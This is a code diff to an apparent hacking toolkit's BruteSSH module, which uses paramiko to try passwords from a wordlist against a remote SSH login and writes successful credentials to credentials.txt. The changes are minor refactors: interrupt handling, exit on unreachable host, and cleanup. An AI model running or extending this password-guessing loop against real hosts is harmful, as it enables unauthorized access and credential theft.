@@ -3,7 +3,7 @@
 from assets.banners import brutessh_banner
 from assets.colors import *
 from assets.designs import logo, author
-from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, user_prefix
+from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, user_prefix, unable_to_connect_prefix
 from assets.properties import clear_screen
 from assets.shortcuts import Exit
 from .brute_force import BruteForce
@@ -62,11 +62,14 @@ class BruteSSH:
             Exit()
 
     def set_ready(self):
-        passwords = open(self.wordlist_set).read().split("\n")
-        for password in passwords:
-            if self.brute_forcing(self.host_set, self.user_set, password):
-                open("credentials.txt", "w").write(f"{self.user_set}@{self.host_set}:{password}")
-                break
+        try:
+            passwords = open(self.wordlist_set).read().split("\n")
+            for password in passwords:
+                if self.brute_forcing(self.host_set, self.user_set, password):
+                    open("credentials.txt", "w").write(f"{self.user_set}@{self.host_set}:{password}")
+                    break
+        except KeyboardInterrupt:
+            self.result()
 
     def brute_forcing(self, hostname, username, password):
         self.header()
@@ -92,7 +95,8 @@ class BruteSSH:
         except paramiko.ssh_exception.NoValidConnectionsError:
             print(RED + "\t[!] Host: " + hostname + " is unreachable, timed out." + WHITE)
             os.system('sleep 1')
-            BruteSSH()
+            print(unable_to_connect_prefix)
+            Exit()
         except KeyboardInterrupt:
             self.result()
         else:
@@ -103,7 +107,7 @@ class BruteSSH:
     def result(self):
         try:
             self.header()
-            if self.succ_fail == True:
+            if self.succ_fail:
                 color = GREEN
             else:
                 color = RED
@@ -116,7 +120,6 @@ class BruteSSH:
             print('\n\tY): New')
             print('\tZ): Menu')
             print('\tX): Exit\n')
-            os.system('sleep 0.01')
             while True:
                 cmd = input(eagleshell_prefix).lower()
                 if cmd == 'y':
